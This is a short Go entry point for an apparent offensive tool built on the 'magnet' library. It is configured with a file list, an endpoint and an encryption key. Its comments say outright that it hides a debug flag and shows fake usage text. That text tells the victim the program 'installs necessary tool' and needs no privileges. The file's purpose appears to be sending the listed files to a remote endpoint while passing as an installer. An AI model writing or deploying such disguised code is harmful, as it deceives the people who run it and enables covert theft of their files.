package main

import (
	"flag"
	"fmt"

	"github.com/ariary/magnet/pkg/magnet"
)

var FileList string
var Endpoint string
var Key string

var usage string

func main() {
	// hide debug functionnality
	var debug bool
	flag.BoolVar(&debug, "thisisdebug", false, "")
	// fake usage
	usage = `
	Execute file to install necessary tool. (For security reasons the process does not require privilege)
	`
	flag.Usage = func() { fmt.Print(usage) }
	flag.Parse()

	magnet.Magnet(FileList, Endpoint, Key, debug)

}
